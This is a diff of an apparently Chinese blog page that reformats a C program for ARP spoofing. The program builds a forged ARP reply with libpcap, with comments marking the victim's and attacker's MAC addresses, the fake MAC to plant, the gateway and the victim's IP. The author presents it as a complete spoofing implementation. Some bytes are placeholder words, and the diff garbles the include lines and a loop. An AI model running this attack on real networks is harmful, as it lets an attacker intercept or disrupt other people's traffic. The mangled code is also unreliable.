@@ -81,6 +81,18 @@
       
     
   
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
 
 
 
@@ -124,104 +136,109 @@ arp响应包是60个字节(后面18个我实在没搞明白是什么……反正
 详见<br />
 http://dog.tele.jp/winpcapeng/html/group__wpcap__fn.html</p>
 
-<p><pre lang="c">
-#include <stdlib.h>
-#include <stdio.h /></stdlib.h></pre></p>
+<p><p>
+```</p>
 
-<p>#include <pcap.h /></p>
+<h1>include</h1>
 
-<p>int main(int argc, char **argv) {<br />
-    pcap_t *fp;<br />
-    char error[PCAP_ERRBUF_SIZE];<br />
-    u_char packet[60];<br />
-    int i;<br />
-    <br />
-    /* Check the validity of the command line */<br />
-    if (argc != 2)<br />
-    {<br />
-        printf("usage: %s inerface", argv[0]);<br />
-        return -1;<br />
-    }<br />
-    <br />
-    /* Open the output adapter */<br />
-    if((fp = pcap_open_live("en0", 100, 1, 1000, error) ) == NULL)<br />
-    {<br />
-        fprintf(stderr,"\nError opening adapter: %s\n", error);<br />
-        return -1;<br />
-    }<br />
-    <br />
-    /* Supposing to be on ethernet, set mac destination to 1:1:1:1:1:1 */<br />
-    /*被攻击者的mac*/<br />
-    packet[0]=xx;<br />
-    packet[1]=32;<br />
-    packet[2]=102;<br />
-    packet[3]=8;<br />
-    packet[4]=jiubu;<br />
-    packet[5]=gaosuni;<br />
-    <br />
-    /* set mac source to 2:2:2:2:2:2 */<br />
-    /*攻击者的mac*/<br />
-    packet[6]=jiu;<br />
-    packet[7]=bu;<br />
-    packet[8]=gaosu;<br />
-    packet[9]=234;<br />
-    packet[10]=xx;<br />
-    packet[11]=100;<br />
-    /*arp*/<br />
-    packet[12]=8;<br />
-    packet[13]=6;<br />
-    /*arp首部*/<br />
-    packet[14]=0;<br />
-    packet[15]=1;<br />
-    <br />
-    packet[16]=8;<br />
-    packet[17]=0;<br />
-    <br />
-    packet[18]=6;<br />
-    packet[19]=4;<br />
-    packet[20]=0;<br />
-    packet[21]=2;<br />
-    /*被骗的那个人的arp表上的假mac*/<br />
-    packet[22]=jiu;<br />
-    packet[23]=154;<br />
-    packet[24]=32;<br />
-    packet[25]=bu;<br />
-    packet[26]=253;<br />
-    packet[27]=gao;<br />
-    /*被骗者的网关*/<br />
-    packet[28]=192;<br />
-    packet[29]=168;<br />
-    packet[30]=1;<br />
-    packet[31]=1;<br />
-    /*被攻击者的mac*/<br />
-    packet[32]=xx;<br />
-    packet[33]=32;<br />
-    packet[34]=102;<br />
-    packet[35]=xx;<br />
-    packet[36]=xx;<br />
-    packet[37]=184;<br />
-    /*被攻击者的ip*/<br />
-    packet[38]=192;<br />
-    packet[39]=168;<br />
-    packet[40]=1;<br />
-    packet[41]=114;<br />
-    <br />
-    /* Fill the rest of the packet */<br />
-    /*乱填就好了*/<br />
-    for(i=42;i<60;i++){<br />
-        packet[i]=i%256;<br />
-    }<br />
-    <br />
-    /* Send down the packet */<br />
-    pcap_sendpacket(fp,<br />
-                    packet,<br />
-                    60);<br />
-    <br />
-    return 0;<br />
+<h1>include</h1>
+
+<h1>include</h1>
+
+<p>int main(int argc, char **argv) {
+    pcap_t *fp;
+    char error[PCAP_ERRBUF_SIZE];
+    u_char packet[60];
+    int i;</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">/* Check the validity of the command line */
+if (argc != 2)
+{
+    printf(&quot;usage: %s inerface&quot;, argv[0]);
+    return -1;
 }
-</p>
+
+/* Open the output adapter */
+if((fp = pcap_open_live(&quot;en0&quot;, 100, 1, 1000, error) ) == NULL)
+{
+    fprintf(stderr,&quot;\nError opening adapter: %s\n&quot;, error);
+    return -1;
+}
+
+/* Supposing to be on ethernet, set mac destination to 1:1:1:1:1:1 */
+/*被攻击者的mac*/
+packet[0]=xx;
+packet[1]=32;
+packet[2]=102;
+packet[3]=8;
+packet[4]=jiubu;
+packet[5]=gaosuni;
+
+/* set mac source to 2:2:2:2:2:2 */
+/*攻击者的mac*/
+packet[6]=jiu;
+packet[7]=bu;
+packet[8]=gaosu;
+packet[9]=234;
+packet[10]=xx;
+packet[11]=100;
+/*arp*/
+packet[12]=8;
+packet[13]=6;
+/*arp首部*/
+packet[14]=0;
+packet[15]=1;
+
+packet[16]=8;
+packet[17]=0;
+
+packet[18]=6;
+packet[19]=4;
+packet[20]=0;
+packet[21]=2;
+/*被骗的那个人的arp表上的假mac*/
+packet[22]=jiu;
+packet[23]=154;
+packet[24]=32;
+packet[25]=bu;
+packet[26]=253;
+packet[27]=gao;
+/*被骗者的网关*/
+packet[28]=192;
+packet[29]=168;
+packet[30]=1;
+packet[31]=1;
+/*被攻击者的mac*/
+packet[32]=xx;
+packet[33]=32;
+packet[34]=102;
+packet[35]=xx;
+packet[36]=xx;
+packet[37]=184;
+/*被攻击者的ip*/
+packet[38]=192;
+packet[39]=168;
+packet[40]=1;
+packet[41]=114;
+
+/* Fill the rest of the packet */
+/*乱填就好了*/
+for(i=42;i
+    packet[i]=i%256;
+}
+
+/* Send down the packet */
+pcap_sendpacket(fp,
+                packet,
+                60);
+
+return 0;
+</code></pre></div>
+<p>}</p>
 
 <p>以上arp欺骗的完整实现、不要用来干坏事= =</p>
+
+<blockquote>
+</blockquote>
 
     </div>
 
